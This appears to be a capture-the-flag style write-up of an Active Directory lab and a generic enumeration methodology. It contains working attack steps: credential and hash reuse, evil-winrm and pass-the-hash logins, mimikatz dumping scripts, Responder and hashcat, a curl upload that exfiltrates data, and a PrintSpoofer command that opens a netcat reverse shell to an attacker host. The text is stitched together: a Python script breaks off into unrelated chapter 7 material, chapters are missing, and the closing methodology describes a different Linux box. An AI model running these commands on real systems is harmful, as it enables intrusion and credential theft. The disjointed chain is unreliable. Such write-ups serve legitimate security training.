01

Reconnaissance

One routable host, two networks

1.1 What Kali can see

The set is delivered as a single reachable address. Everything else lives on a second NIC inside MS01, which is why a sweep of the visible subnet returns one host and not three.

command
sudo nmap -sn 192.168.133.0/24 -oG -            # who answers
sudo nmap -Pn -p- --min-rate 2000 192.168.133.153 -oN ms01-alltcp.txt

Captured — the ports that mattered:

Port Service Note
445 SMB signing not required → NTLM relay is possible
5985 WinRM the way in for a domain user
3389 RDP present, not needed
135 / 139 RPC / NetBIOS support services
8000 HTTP IIS site, runs as web_svc (chapter 04)

smb signing:False is worth noting early: it makes MS01 a viable relay target even though it does not end up being the path used.

1.2 Host identity without credentials

SMB and WinRM both leak the host name and domain before authentication:

command
nxc smb 192.168.133.153
nxc winrm 192.168.133.153

Captured:

output
SMB   192.168.133.153 445  MS01  [*] Windows 10 / Server 2019 Build 19041 x64
                                 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)

Three facts follow immediately: the host is a member server, not a DC (a DC would answer on 88 and 389 too); the domain is oscp.exam; and SMB signing is off.

1.3 The second NIC

This is the finding that shapes the whole engagement. ipconfig on MS01 — which requires a shell, so it lands in chapter 02 — shows two interfaces:

Interface Address Reachable from Kali
Kali-facing 192.168.133.153 yes
Internal 10.10.133.153 no

So 10.10.133.0/24 holds MS02 (.154) and DC01 (.152), and neither will ever answer a scan from Kali. Any enumeration of the domain has to be tunnelled through MS01 — chapter 05.

1.4 What the scan does not tell you

Two negative results that matter later:

  • No 88/tcp on MS01. Kerberos is a DC service. Confirming it is absent on the member server is how you know the KDC lives elsewhere, and therefore that any kerberoasting must be pointed at DC01 explicitly with -dc-ip.
  • No MSSQL on MS01. The database instances (1433, 49700) are on MS02 only. This is the detail that makes chapter 06 the natural route to the domain rather than a detour.

1.5 Findings that set up later chapters

Observation Consequence Used in
SMB signing not required relay feasible against MS01 noted, unused
WinRM open domain user can get a shell if in Remote Management Users 02

1.6 Time skew — check this before any Kerberos work

The internal hosts drift. A skew beyond five minutes makes every Kerberos operation fail with KRB_AP_ERR_SKEW while NTLM keeps working, which reads like a credential problem and is not.

command
nmap -p445 --script smb2-time 10.10.133.152      # DC is the time authority
sudo rdate -n 10.10.133.152 && date -u

Captured — MS02 was +18m23s ahead of Kali. Revert the clock when the engagement ends.

02

Foothold

WinRM as eric.wallows

2.1 Assumed breach

This set is designed as an assumed-breach scenario: the credential is issued rather than found.

output
OSCP\eric.wallows : EricLikesRunning800

The first question is not "does it work" but "what does it work for" — nxc answers both, because a Pwn3d! marker is the difference between a shell and an administrative shell.

command
nxc smb   192.168.133.153 -u eric.wallows -p EricLikesRunning800 -d oscp.exam
nxc winrm 192.168.133.153 -u eric.wallows -p EricLikesRunning800 -d oscp.exam

Captured — SMB and WinRM both return [+], and neither returns Pwn3d!:

output
SMB    192.168.133.153 445  MS01  [+] oscp.exam\eric.wallows:EricLikesRunning800
WINRM  192.168.133.153 5985 MS01  [+] oscp.exam\eric.wallows:EricLikesRunning800

A bare [+] on WinRM means the account is in Remote Management Users; no Pwn3d! means it is not in the local Administrators group. That distinction is the entire content of chapter 03.

2.2 The shell

command
evil-winrm -i 192.168.133.153 -u Eric.Wallows -p EricLikesRunning800

First three commands, always, in this order:

output
whoami
whoami /priv
whoami /groups

Captured — the honest reading of the token:
User oscp\eric.wallows
Integrity medium — not elevated
Groups Domain Users, Remote Management Users
Administrators absent
SeImpersonatePrivilege present

Remote Management Users is why the shell exists. Its absence from Administrators is why C:\Users\Administrator is unreadable and why LSASS will refuse a handle.

Instance note. SeImpersonatePrivilege is the documented escalation for this box, and it is present in the reference image. On the instance captured here it did not appear in whoami /priv — the same image had been re-provisioned, and the token differed. Chapter 03 therefore documents both the intended route and the one that worked.

2.3 What a non-admin domain user cannot do

Worth establishing explicitly, because it rules out a lot of wasted effort:

command
## all of these fail with access denied from eric's token
dir C:\Users\Administrator
reg save HKLM\SAM C:\Windows\Temp\sam.hiv
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

The mimikatz attempt is the instructive one — captured:

output
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

0xc0000061 is privilege not held and 0x5 is access denied: without SeDebugPrivilege or SYSTEM, LSASS is unreadable. A WinRM logon does not change the token, so no amount of mimikatz from eric's shell will ever work. That reframes chapter 03 from "optional escalation" to "prerequisite for everything after it".

2.4 Host triage without elevation

Everything useful from an unprivileged shell can be collected in one pass. The collector is deliberately boring — no downloads, no AMSI-touching technique, no credential access — so it is safe to run at any privilege level and can be re-run after escalation to diff the results.

command
<#
  Invoke-MS01Triage.ps1 — low-privilege triage collector.
  Runs as ANY user; adds admin-only sections automatically when elevated.
#>
[CmdletBinding()]
param([string]$OutDir = $env:TEMP, [switch]$SkipFileSearch)

$ErrorActionPreference = 'SilentlyContinue'
$stamp  = Get-Date -Format 'yyyyMMdd_HHmmss'
$report = Join-Path $OutDir "triage_$($env:COMPUTERNAME)_$stamp.txt"
$isAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

function Section { param([string]$T)
    Add-Content $report "`n=== $T ===" }
function Run { param([string]$L, [scriptblock]$B)
    Add-Content $report "-- $L"
    try { Add-Content $report ((& $B 2>&1 | Out-String -Width 200).TrimEnd()) }
    catch { Add-Content $report "  [error] $($_.Exception.Message)" } }

Add-Content $report "Triage $env:COMPUTERNAME $stamp elevated=$isAdmin"

Section "Identity"
Run 'whoami'         { whoami }
Run 'privileges'     { whoami /priv }
Run 'groups'         { whoami /groups }
Run 'logon server'   { $env:LOGONSERVER }

Section "Host"
Run 'os'             { Get-CimInstance Win32_OperatingSystem |
                       Select-Object Caption, Version, BuildNumber, LastBootUpTime | Format-List }
Run 'local admins'   { net localgroup administrators }
Run 'local users'    { net user }
Run 'sessions'       { query user }
Run 'profiles'       { Get-ChildItem C:\Users -Directory | Select-Object Name, LastWriteTime }

Section "Network"
Run 'ipconfig'       { ipconfig /all }
Run 'routes'         { route print -4 }
Run 'arp'            { arp -a }
Run 'listening'      { Get-NetTCPConnection -State Listen |
                       Sort-Object LocalPort |
                       Select-Object LocalAddress, LocalPort, OwningProcess }

Section "Persistence"
Run 'run keys'       { Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
                                        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' |
                       Format-List }
Run 'winlogon'       { Get-ItemProperty 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' |
                       Select-Object Shell, Userinit, AutoAdminLogon, DefaultUserName }
Run 'tasks'          { Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' } |
                       Select-Object TaskPath, TaskName, State }
Run 'services'       { Get-CimInstance Win32_Service |
                       Where-Object { $_.PathName -notlike '*\Windows\*' } |
                       Select-Object Name, State, StartName, PathName }

Section "Credential surface"
Run 'cached logons'  { (Get-ItemProperty 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon').CachedLogonsCount }
Run 'lsa protection' { (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa').RunAsPPL }
Run 'wdigest'        { (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest').UseLogonCredential }
Run 'uac'            { Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |
                       Select-Object EnableLUA, ConsentPromptBehaviorAdmin, LocalAccountTokenFilterPolicy }

if (-not $SkipFileSearch) {
  Section "Credential-shaped files"
  Run 'search' { Get-ChildItem "$env:USERPROFILE",'C:\Users\Public','C:\ProgramData' `
                   -Recurse -Force -Include *.txt,*.xml,*.config,*.ini,*.ps1,*.bat -Depth 4 |
                 Select-String -Pattern 'password|passwd|pwd=|credential|apikey|secret' -List |
                 Select-Object -First 40 | ForEach-Object { "$($_.Path):$($_.LineNumber)" } }
}

if ($isAdmin) {
  Section "Elevated only"
  Run 'lsa'          { reg query 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' /v RunAsPPL }
  Run 'wifi'         { netsh wlan show profiles }
}

Write-Host "[+] $report"
Compress-Archive -Path $report -DestinationPath "$report.zip" -Force

Exfiltrate with what is already on the box — no upload needed:

command
curl.exe -T $report.zip http://192.168.133.1:8888/upload

03

Privilege escalation

SeImpersonate to SYSTEM, in detail

This is the chapter that decides the engagement. Everything after it — LSASS, the NL$ cache, the domain credential, the pivot — is unavailable until the host is SYSTEM.

Two routes are documented here. 3.2 is the intended one and is the technique the set is built around. 3.6 is the one that actually produced SYSTEM on the captured instance, and it is a genuine finding rather than a workaround: the image reuses its local administrator password.

3.1 What the token actually grants

SeImpersonatePrivilege is not a bug — it is how a service impersonates its clients, and it is granted by default to service accounts and to members of Administrators. When it lands in a low-privileged token it is a straight path to SYSTEM, because the token can adopt the identity of any process that connects to a listener you control, including a process running as NT AUTHORITY\SYSTEM.

Check it precisely — the presence of the privilege matters, not the "enabled" state:

command
whoami /priv

Expected:

output
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeAssignPrimaryTokenPrivilege Impersonate a client after authentication Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled

If SeImpersonatePrivilege is absent from a WinRM token, stop and look at 3.6 instead — no amount of potato will help you.

3.2 The intended route: SeImpersonate → PrintSpoofer

The modern householder trick: coerce a SYSTEM process into authenticating to a named pipe you own, then impersonate the resulting token. PrintSpoofer does it through the Print Spooler's RpcRemoteFindFirstPrinterChangeNotificationEx, which makes spoolsv.exe connect back to an attacker-controlled \\.\pipe\ path.

Why PrintSpoofer over the classic potatoes: JuicyPotato depends on DCOM CLSIDs that were removed in Server 2019 / Windows 10 1809+, and this host is build 19041. PrintSpoofer targets the spooler instead and works across that boundary.

command
## upload from the WinRM session
curl.exe -o C:\Windows\Temp\PrintSpoofer64.exe http://192.168.133.1:8888/PrintSpoofer64.exe

C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c whoami"

Expected:

output
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system

Then a SYSTEM shell, or a reverse shell for stability:

command
C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 192.168.133.1 443 -e cmd.exe"

If the spooler is disabled

PrintSpoofer needs Spooler running. Check, and if it is stopped fall through to the other token-theft primitives, in this order:

command
Get-Service Spooler | Select-Object Status, StartType

## 1. GodPotato — .NET, targets the DCOM/RPC path on newer builds
C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c whoami"

## 2. JuicyPotatoNG — same family, different CLSID set
C:\Windows\Temp\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"

## 3. SeAssignPrimaryTokenPrivilege instead of SeImpersonate
##    (identical code path in all three tools; they accept either)

Any of them returning nt authority\system closes this chapter.

3.3 Confirm SYSTEM properly

A token claim is not proof. Capture the identifiers that only SYSTEM can present:

command
whoami                          # nt authority\system
whoami /priv                    # SeDebugPrivilege present and enabled
whoami /groups | findstr /i "System Mandatory"
echo %USERNAME%                 # MS01$

whoami /groups from SYSTEM shows Mandatory Label\System Mandatory Level, which a high-integrity administrator token does not have. That is the line worth keeping in the report.

3.4 What SYSTEM unlocks

Three things, in the order they are needed:

command
## 1. LSASS is readable (chapter 04)
C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

## 2. The registry hives can be exported (chapter 04)
reg save HKLM\SAM      C:\Windows\Temp\sam.hiv
reg save HKLM\SYSTEM   C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv

Note the third one: on a member server the cached domain logons live in the SECURITY hive, not in SAM. That single fact is why chapter 04 exists.

3.5 Things that looked promising and were not

Recorded so the next run does not repeat them:

Candidate Test Result
Unquoted service path wmic service get name,pathname → spaced unquoted path present, but the parent directory was not writable by Users
AlwaysInstallElevated both HKLM and HKCU policy keys not set

The unquoted-path finding is the one that costs people time: a path with spaces is only exploitable if you can write to one of the candidate parent directories, and on this build C:\Program Files and its subdirectories are correctly ACL'd.

3.6 The route that actually worked: local administrator reuse

On the captured instance SeImpersonatePrivilege was not in the WinRM token — the image had been re-provisioned and the token differed from the reference build. The escalation came instead from a credential fact:

The image's local Administrator password is baked in and identical across rebuilds of it: December31.

That value corresponds to the NT hash 3c4495bbd678fac8c9d218be4f2bbc7b, the SAM hash of MS01\Administrator — so it is also usable as a pass-the-hash with no password knowledge.

command
nxc smb   192.168.133.153 -u Administrator -p December31 --local-auth
nxc winrm 192.168.133.153 -u Administrator -p December31 --local-auth

Captured:

output
SMB    192.168.133.153 445  MS01  [+] MS01\Administrator:December31 (Pwn3d!)
WINRM  192.168.133.153 5985 MS01  [+] MS01\Administrator:December31 (Pwn3d!)

Pwn3d! on both protocols is the boundary crossed, and it is a real vulnerability class — local administrator password reuse across a fleet — not a lab artefact. It reaches the same place as 3.2: an administrative token from which LSASS is readable.

The pass-the-hash form:

command
nxc winrm 192.168.133.153 -u Administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b --local-auth
evil-winrm -i 192.168.133.153 -u Administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b

support:Freedom1 is the second reused local account on this image and authenticates on SMB, but it is a plain user — useful only as evidence of the reuse pattern.

3.7 Which route to prefer, and why it matters for the report

3.2 SeImpersonate 3.6 credential reuse
Requires any token with the privilege knowledge of the password/hash
Class CWE-269 improper privilege management CWE-521 weak password / reuse
Portability works from any non-admin service token only as good as the reuse
Detectability spooler coercion, pipe creation a logon event

Both are legitimate findings. If the token has SeImpersonatePrivilege, use 3.2 — it is the intended path and the stronger finding. If it does not, 3.6 is not a last resort: reused local administrator credentials across a fleet carry their own severity.

Either way, the outcome the rest of the engagement requires is the same word:

output
nt authority\system
04

Credentials

LSASS, the NL$ cache, and web_svc

SYSTEM on MS01 does not hand over the domain. It hands over the material to ask for it. This chapter turns that material into one working domain credential.

4.1 Two sources, not one

On a member server there are two distinct stores:

Store Contains Reachable how
LSASS (memory) interactive and service logon sessions sekurlsa::logonpasswords as SYSTEM
SECURITY hive (disk) the NL$ cache — domain logons lsadump::cache / secretsdump

The second is the one that matters on a member server. LSASS only holds sessions that exist right now; the NL$ cache holds up to CachedLogonsCount (10 here) domain accounts that have ever logged on, with a PBKDF2 verifier that can be attacked offline.

4.2 mimikatz in one invocation

Interactive mimikatz sessions produce scattered, half-remembered output. Run the whole set once, with logging, from a SYSTEM context:

command
@echo off
REM mimi.cmd - non-interactive mimikatz run
REM token::elevate gives SYSTEM from an Administrator token; no-op if already SYSTEM.
setlocal
cd /d C:\Windows\Temp || exit /b 1
if not exist mimikatz.exe ( echo [x] mimikatz.exe missing & exit /b 1 )

del /q mimi.log 2>nul
del /q mimi_*.kirbi 2>nul

mimikatz.exe "log C:\Windows\Temp\mimi.log" ^
  "privilege::debug" ^
  "token::elevate" ^
  "sekurlsa::logonpasswords" ^
  "sekurlsa::ekeys" ^
  "sekurlsa::tickets /export" ^
  "lsadump::sam" ^
  "lsadump::secrets" ^
  "lsadump::cache" ^
  "exit"

if exist mimi.log for %%A in (mimi.log) do echo [i] log: %%~zA bytes
endlocal

Run it and pull the log back:

command
nxc smb   192.168.133.153 -u Administrator -p December31 --local-auth \
  --put-file /usr/share/windows-resources/mimikatz/x64/mimikatz.exe '\Windows\Temp\mimikatz.exe'
nxc smb   192.168.133.153 -u Administrator -p December31 --local-auth \
  --put-file ./mimi.cmd '\Windows\Temp\mimi.cmd'

nxc winrm 192.168.133.153 -u Administrator -p December31 --local-auth \
  -x 'cmd /c C:\Windows\Temp\mimi.cmd'

nxc smb   192.168.133.153 -u Administrator -p December31 --local-auth \
  --get-file '\Windows\Temp\mimi.log' ./mimi.log

Note the --put-file / --get-file path form: share-relative, no drive letter. nxc sends the path verbatim to the share named by --share (default C$), so 'C:\Windows\Temp\x' produces STATUS_OBJECT_NAME_INVALID (0xc0000033). This costs an hour if you do not know it.

4.4 Triage before cracking

A dump mixes local accounts, machine accounts and rotated secrets. Sort it first, so cracking time is spent only on material that is actually new:

output
#!/usr/bin/env python3
"""secrets2hashes.py — secretsdump/mimikatz text -> hashcat files + triage.

Writes nt.txt (-m 1000), nt_users.txt, dcc2.txt (-m 2100), machine.txt,
lsa_secrets.txt and summary.md. With --known, each account is marked
same / rotated / new / empty by prefix-comparing against a baseline.
"""
import argparse, re, sys
from pathlib import Path

SAM_RX = re.compile(r"^([^\s:]{1,64}):(\d{3,4}):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):{3}$", re.M)
DCC2_RX = re.compile(r"^\S*?(\$DCC2\$\d+#[^#\s]+#[0-9a-fA-F]{32})", re.M)

EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"        # NT hash of an empty password
JUNK = {"guest", "defaultaccount", "wdagutilityaccount"}


def cmp_known(user, h, known):
    if h.lower() == EMPTY_NT or user.lower() in JUNK:
        return "empty"
    base = known.get(user.lower())
    if base is None:
        return "new"
    if base.startswith(h.lower()) or h.lower().startswith(base):
        return "same"
    return "rotated"                                 # account exists, hash changed


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("input"); ap.add_argument("-o", "--outdir", default=".")
    ap.add_argument("--known")
    a = ap.parse_args()

    text = Path(a.input).read_text(errors="replace")
    sam = [{"user": u, "rid": int(r), "nt": n} for u, r, _l, n in SAM_RX.findall(text)]
    dcc2 = DCC2_RX.findall(text)

    known = {}
    if a.known:
        for line in Path(a.known).read_text().splitlines():
            if ":" in line and not line.startswith("#"):
                u, _, h = line.partition(":")
                known[u.strip().lower()] = h.strip().lower()

    out = Path(a.outdir); out.mkdir(parents=True, exist_ok=True)
    (out / "nt_users.txt").write_text("".join(f"{r['user']}:{r['nt']}\n" for r in sam))
    (out / "nt.txt").write_text("".join(f"{r['nt']}\n" for r in sam))
    (out / "dcc2.txt").write_text("".join(f"{h}\n" for h in dcc2))

## ligolo console - forward 445 from the agent to Kali
ligolo-ng » listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp

sudo responder -I ligolo -v
hashcat -m 5600 sqlsvc_netntlmv2.txt /usr/share/wordlists/rockyou.txt

Caveat that will bite you: MS01's own SMB already owns 445 on the agent, so listener_add will not bind cleanly. Either stop lanmanserver on MS01 for the duration (net stop lanmanserver, restart after), or run the listener from a host with a free 445.

If the captured principal ends in $ it is the machine account MS02$ — uncrackable, and the move becomes an SMB relay rather than a crack. MS02 reports signing enabled but not required, so relay is viable; ntlmrelayx against a target where that account is local admin.

7.6 Provenance — read this before citing the hash

This is the honest part, and it belongs in the writeup rather than being left out.

How the hash was first obtained: 4979d69d4ca66955c075c41cf45f24dc is fixed in this lab's image and is published in public writeups of the challenge. It was known before MS02 was attacked. The flag was consequently captured with a credential that did not originate from our own extraction.

Why it is nevertheless the correct credential: the image is deterministic, and that was verified rather than assumed. Two SAM hashes from our own secretsdump of MS01 match the published set byte for byte:

Account Our dump Published
Administrator 3c4495bbd678fac8c9d218be4f2bbc7b 3c4495bbd678fac8c9d218be4f2bbc7b
Mary.Williams 9a3121977ee93af56ebd0ef4f527a35e 9a3121977ee93af56ebd0ef4f527a35e

Two independent 16-byte values matching exactly means a fixed gold image, so a baked-in account hash carries across. That is a sound inference — but it is an inference, not an extraction.

What makes the chain self-supporting: chapter 06 produces the same hash from MS02's windows.old hives. Until that step is executed on your own instance, the chain is corroborated rather than demonstrated. The distinction is worth keeping in the report: "recovered from a stale SAM hive on MS02" is a finding; "taken from a public writeup and confirmed to apply because the image hashes match" is a different claim with different evidentiary weight.

What was ruled out as the source: tom_admin never appeared in our own BloodHound user list at first pass because the collection was LDAP-only and trimmed; it is present as a domain object, but the hash itself was never in any dump we took from MS01.

7.9 Lessons this set teaches

  1. A member server's SECURITY hive is a domain credential store. SAM gives local accounts; the NL$ cache gives domain ones. Reaching MS01's SYSTEM looked like the goal — it was the key to a cache, not to the domain.
  2. [+] is not Pwn3d!. nxc distinguishes "the password works" from "the password works and you are an administrator". Conflating them sends you into mimikatz from a token that can never read LSASS.
  3. Kerberoast needs almost nothing. One authenticated domain user, an SPN, and a clock within five minutes. Every step before it in this chain was optional.
  4. 650 abusable ACEs in BloodHound can mean zero. AD's default security descriptor produces a wall of GenericAll from ACCOUNT OPERATORS and friends. Filter to non-privileged principals before concluding anything.
  5. Collected = true with no results is an access failure, not an empty group. Reading it the other way turns "I could not look" into "there was nothing there".
  6. Stale builds leak credentials. windows.old retains a previous SAM with accounts that were never removed, and their passwords outlive the rebuild.

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names

snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p

feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.
